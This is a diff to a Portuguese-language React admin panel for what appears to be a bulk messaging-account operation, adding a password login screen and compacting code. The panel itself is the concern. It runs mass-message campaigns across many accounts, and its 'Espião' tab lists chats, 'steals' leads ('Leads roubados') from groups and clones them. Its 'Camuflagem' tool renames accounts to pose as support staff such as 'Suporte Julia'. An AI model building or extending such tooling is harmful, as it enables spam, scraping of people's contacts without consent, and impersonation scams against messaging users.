@@ -1,7 +1,13 @@
 import { useState, useEffect } from 'react';
 
 export default function AdminPanel() {
-  const [tab, setTab] = useState('dashboard'); // dashboard, spy, tools
+  // --- ESTADO DE LOGIN (Gatekeeper) ---
+  const [isAuthenticated, setIsAuthenticated] = useState(false);
+  const [passwordInput, setPasswordInput] = useState('');
+  const [loginError, setLoginError] = useState('');
+
+  // --- ESTADOS DO SISTEMA ---
+  const [tab, setTab] = useState('dashboard'); 
   const [sessions, setSessions] = useState([]);
   const [stats, setStats] = useState({ total: 0, pending: 0, sent: 0 });
   const [logs, setLogs] = useState([]);
@@ -16,13 +22,38 @@ export default function AdminPanel() {
   const [chats, setChats] = useState([]);
   const [loadingChats, setLoadingChats] = useState(false);
 
-  // Estados Tools (Identity & Story)
+  // Estados Tools
   const [newName, setNewName] = useState('');
   const [photoUrl, setPhotoUrl] = useState('');
   const [storyUrl, setStoryUrl] = useState('');
   const [storyCaption, setStoryCaption] = useState('');
 
-  // --- INIT ---
+  // --- FUNÇÃO DE LOGIN ---
+  const handleLogin = async (e) => {
+    e.preventDefault();
+    setLoginError('');
+    
+    try {
+      const res = await fetch('/api/admin-login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ password: passwordInput }),
+      });
+      const data = await res.json();
+      
+      if (res.ok && data.success) {
+        setIsAuthenticated(true);
+        // Só carrega os dados DEPOIS de logar
+        fetchData(); 
+      } else {
+        setLoginError('Acesso Negado.');
+      }
+    } catch (error) {
+      setLoginError('Erro de conexão.');
+    }
+  };
+
+  // --- CARREGAMENTO DE DADOS ---
   const fetchData = async () => {
     try {
       const sRes = await fetch('/api/list-sessions');
@@ -34,17 +65,15 @@ export default function AdminPanel() {
     } catch (e) { console.error(e); }
   };
 
-  useEffect(() => { fetchData(); }, []);
-
+  // Logs e Seleção
   const addLog = (text) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${text}`, ...prev]);
-
   const toggleSelect = (phone) => {
     const newSet = new Set(selectedPhones);
     if (newSet.has(phone)) newSet.delete(phone); else newSet.add(phone);
     setSelectedPhones(newSet);
   };
 
-  // --- CRM ACTIONS ---
+  // --- AÇÕES DO SISTEMA ---
   const startRealCampaign = async () => {
      if (selectedPhones.size === 0) return alert('Selecione contas à direita!');
      setProcessing(true);
@@ -54,7 +83,6 @@ export default function AdminPanel() {
          const data = await res.json();
          const leads = data.leads || [];
          if (leads.length === 0) { setProcessing(false); return alert('Sem leads pendentes!'); }
-
          const phones = Array.from(selectedPhones);
          for (let i = 0; i < leads.length; i++) {
              const sender = phones[i % phones.length];
@@ -72,14 +100,11 @@ export default function AdminPanel() {
      setProcessing(false);
   };
 
-  // --- SPY ACTIONS ---
   const loadChats = async (phone) => {
-    setSpyPhone(phone);
-    setLoadingChats(true);
+    setSpyPhone(phone); setLoadingChats(true);
     try {
         const res = await fetch('/api/spy/list-chats', { method: 'POST', body: JSON.stringify({ phone }), headers: {'Content-Type': 'application/json'} });
-        const data = await res.json();
-        setChats(data.chats || []);
+        const data = await res.json(); setChats(data.chats || []);
     } catch (e) {}
     setLoadingChats(false);
   };
@@ -87,54 +112,63 @@ export default function AdminPanel() {
   const handleHarvest = async (chatId, title) => {
       addLog(`🕷️ Roubando ${title}...`);
       await fetch('/api/spy/harvest', { method: 'POST', body: JSON.stringify({ phone: spyPhone, chatId, chatName: title }), headers: {'Content-Type': 'application/json'} });
-      addLog('✅ Leads roubados.');
-      fetchData();
+      addLog('✅ Leads roubados.'); fetchData();
   };
 
   const handleCloneGroup = async (chatId, title) => {
     addLog(`🐑 Clonando ${title}...`);
     const res = await fetch('/api/spy/clone-group', { method: 'POST', body: JSON.stringify({ phone: spyPhone, originalChatId: chatId, originalTitle: title }), headers: {'Content-Type': 'application/json'} });
-    if(res.ok) addLog('✅ Grupo clonado.');
-    else addLog('❌ Erro clone.');
+    if(res.ok) addLog('✅ Grupo clonado.'); else addLog('❌ Erro clone.');
   };
 
-  // --- TOOLS ACTIONS ---
   const handleUpdateProfile = async () => {
       if (selectedPhones.size === 0) return alert('Selecione contas!');
       setProcessing(true);
       for (const phone of Array.from(selectedPhones)) {
           addLog(`🎭 Atualizando perfil de ${phone}...`);
-          await fetch('/api/update-profile', {
-              method: 'POST',
-              headers: {'Content-Type': 'application/json'},
-              body: JSON.stringify({ phone, newName, photoUrl })
-          });
+          await fetch('/api/update-profile', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone, newName, photoUrl }) });
       }
-      setProcessing(false);
-      addLog('✅ Perfis atualizados.');
+      setProcessing(false); addLog('✅ Perfis atualizados.');
   };
 
   const handlePostStory = async () => {
       if (selectedPhones.size === 0) return alert('Selecione contas!');
-      if (!storyUrl) return alert('Cole o link da imagem!');
       setProcessing(true);
       for (const phone of Array.from(selectedPhones)) {
           addLog(`📸 Postando Story em ${phone}...`);
-          const res = await fetch('/api/post-story', {
-              method: 'POST',
-              headers: {'Content-Type': 'application/json'},
-              body: JSON.stringify({ phone, mediaUrl: storyUrl, caption: storyCaption })
-          });
-          if(res.ok) addLog(`✅ Story postado em ${phone}`);
-          else addLog(`❌ Erro story em ${phone}`);
+          await fetch('/api/post-story', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone, mediaUrl: storyUrl, caption: storyCaption }) });
       }
-      setProcessing(false);
+      setProcessing(false); addLog('✅ Stories postados.');
   };
 
+  // --- RENDERIZAÇÃO CONDICIONAL ---
+
+  // 1. TELA DE BLOQUEIO (Se não estiver logado)
+  if (!isAuthenticated) {
+    return (
+      <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', backgroundColor: '#0d1117', fontFamily: 'monospace' }}>
+        <form onSubmit={handleLogin} style={{ background: '#161b22', padding: '40px', borderRadius: '10px', border: '1px solid #30363d', textAlign: 'center', width: '300px' }}>
+            <h2 style={{ color: '#fff', marginTop: 0 }}>🔒 ACESSO RESTRITO</h2>
+            <input 
+              type="password" 
+              placeholder="Senha de Acesso" 
+              value={passwordInput}
+              onChange={e => setPasswordInput(e.target.value)}
+              style={{ width: '100%', padding: '10px', margin: '20px 0', background: '#0d1117', border: '1px solid #30363d', color: '#fff', borderRadius: '5px' }}
+              autoFocus
+            />
+            <button type="submit" style={{ width: '100%', padding: '10px', background: '#238636', color: '#fff', border: 'none', cursor: 'pointer', fontWeight: 'bold' }}>ENTRAR</button>
+            {loginError && <p style={{ color: '#ff5c5c', marginTop: '15px', fontSize: '14px' }}>{loginError}</p>}
+        </form>
+      </div>
+    );
+  }
+
+  // 2. PAINEL ADMIN (Se estiver logado)
   return (
     <div style={{ backgroundColor: '#0d1117', color: '#c9d1d9', minHeight: '100vh', padding: '20px', fontFamily: 'monospace' }}>
       
-      {/* Stats Header */}
+      {/* HEADER */}
       <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '10px', marginBottom: '20px' }}>
           <div style={{ background: '#161b22', padding: '15px', borderRadius: '6px', textAlign: 'center', border: '1px solid #30363d' }}>
               <div style={{ fontSize: '20px', color: '#fff' }}>{stats.total}</div>
@@ -150,18 +184,17 @@ export default function AdminPanel() {
           </div>
       </div>
 
-      {/* Tabs */}
+      {/* ABAS */}
       <div style={{ marginBottom: '20px', borderBottom: '1px solid #30363d', display: 'flex', gap: '10px' }}>
-        <button onClick={() => setTab('dashboard')} style={{ padding: '10px', background: tab === 'dashboard' ? '#238636' : '#21262d', border: 'none', color: 'white', borderRadius: '4px 4px 0 0', cursor: 'pointer' }}>🚀 CRM</button>
-        <button onClick={() => setTab('spy')} style={{ padding: '10px', background: tab === 'spy' ? '#8957e5' : '#21262d', border: 'none', color: 'white', borderRadius: '4px 4px 0 0', cursor: 'pointer' }}>🕵️ Espião</button>
-        <button onClick={() => setTab('tools')} style={{ padding: '10px', background: tab === 'tools' ? '#1f6feb' : '#21262d', border: 'none', color: 'white', borderRadius: '4px 4px 0 0', cursor: 'pointer' }}>🛠️ Ferramentas</button>
+        <button onClick={() => setTab('dashboard')} style={{ padding: '10px', background: tab === 'dashboard' ? '#238636' : '#21262d', border: 'none', color: 'white', cursor: 'pointer' }}>🚀 CRM</button>
+        <button onClick={() => setTab('spy')} style={{ padding: '10px', background: tab === 'spy' ? '#8957e5' : '#21262d', border: 'none', color: 'white', cursor: 'pointer' }}>🕵️ Espião</button>
+        <button onClick={() => setTab('tools')} style={{ padding: '10px', background: tab === 'tools' ? '#1f6feb' : '#21262d', border: 'none', color: 'white', cursor: 'pointer' }}>🛠️ Ferramentas</button>
       </div>
 
       <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '20px' }}>
         
-        {/* Main Content */}
+        {/* CONTEÚDO PRINCIPAL */}
         <div>
-            {/* TAB 1: DASHBOARD */}
             {tab === 'dashboard' && (
                 <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
                     <h3>Disparo em Massa</h3>
@@ -172,7 +205,6 @@ export default function AdminPanel() {
                 </div>
             )}
 
-            {/* TAB 2: SPY */}
             {tab === 'spy' && (
                 <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
                      {!spyPhone ? <p>Selecione uma conta &gt;&gt;</p> : (
@@ -200,36 +232,30 @@ export default function AdminPanel() {
                 </div>
             )}
 
-            {/* TAB 3: TOOLS (Identity & Stories) */}
             {tab === 'tools' && (
                 <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
-                    {/* Identity Block */}
                     <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
                         <h3 style={{marginTop: 0, color: '#d2a8ff'}}>🎭 Camuflagem</h3>
-                        <input type="text" placeholder="Novo Nome (ex: Suporte Julia)" value={newName} onChange={e => setNewName(e.target.value)} style={{ width: '100%', padding: '10px', marginBottom: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff' }} />
-                        <input type="text" placeholder="URL da Foto (JPG)" value={photoUrl} onChange={e => setPhotoUrl(e.target.value)} style={{ width: '100%', padding: '10px', marginBottom: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff' }} />
-                        <button onClick={handleUpdateProfile} disabled={processing} style={{ width: '100%', padding: '10px', background: '#8957e5', color: 'white', border: 'none', cursor: 'pointer' }}>ATUALIZAR PERFIL (Selecionados)</button>
+                        <input type="text" placeholder="Novo Nome" value={newName} onChange={e => setNewName(e.target.value)} style={{ width: '100%', padding: '10px', marginBottom: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff' }} />
+                        <input type="text" placeholder="URL da Foto" value={photoUrl} onChange={e => setPhotoUrl(e.target.value)} style={{ width: '100%', padding: '10px', marginBottom: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff' }} />
+                        <button onClick={handleUpdateProfile} disabled={processing} style={{ width: '100%', padding: '10px', background: '#8957e5', color: 'white', border: 'none', cursor: 'pointer' }}>ATUALIZAR PERFIL</button>
                     </div>
-
-                    {/* Story Block */}
                     <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px', border: '1px solid #1f6feb' }}>
-                        <h3 style={{marginTop: 0, color: '#58a6ff'}}>📸 Postar Stories</h3>
-                        <p style={{fontSize: '12px', color: '#8b949e'}}>Posta um story nas contas selecionadas. Use link direto de imagem/vídeo.</p>
-                        <input type="text" placeholder="URL da Mídia (https://site.com/foto.jpg)" value={storyUrl} onChange={e => setStoryUrl(e.target.value)} style={{ width: '100%', padding: '10px', marginBottom: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff' }} />
-                        <input type="text" placeholder="Legenda (Opcional)" value={storyCaption} onChange={e => setStoryCaption(e.target.value)} style={{ width: '100%', padding: '10px', marginBottom: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff' }} />
-                        <button onClick={handlePostStory} disabled={processing} style={{ width: '100%', padding: '10px', background: '#1f6feb', color: 'white', border: 'none', cursor: 'pointer' }}>POSTAR STORY EM MASSA</button>
+                        <h3 style={{marginTop: 0, color: '#58a6ff'}}>📸 Stories</h3>
+                        <input type="text" placeholder="URL da Mídia" value={storyUrl} onChange={e => setStoryUrl(e.target.value)} style={{ width: '100%', padding: '10px', marginBottom: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff' }} />
+                        <button onClick={handlePostStory} disabled={processing} style={{ width: '100%', padding: '10px', background: '#1f6feb', color: 'white', border: 'none', cursor: 'pointer' }}>POSTAR STORY</button>
                     </div>
                 </div>
             )}
             
-            {/* Logs */}
+            {/* LOGS */}
             <div style={{ marginTop: '20px', background: '#000', padding: '10px', height: '200px', overflowY: 'auto', fontSize: '12px', fontFamily: 'monospace', borderRadius: '6px' }}>
                 <div style={{color: '#58a6ff'}}>root@logs:~#</div>
                 {logs.map((l, i) => <div key={i}>{l}</div>)}
             </div>
         </div>
 
-        {/* Right Column: Accounts */}
+        {/* COLUNA DIREITA: CONTAS */}
         <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
             <h3>Contas ({sessions.length})</h3>
             {sessions.map(s => (
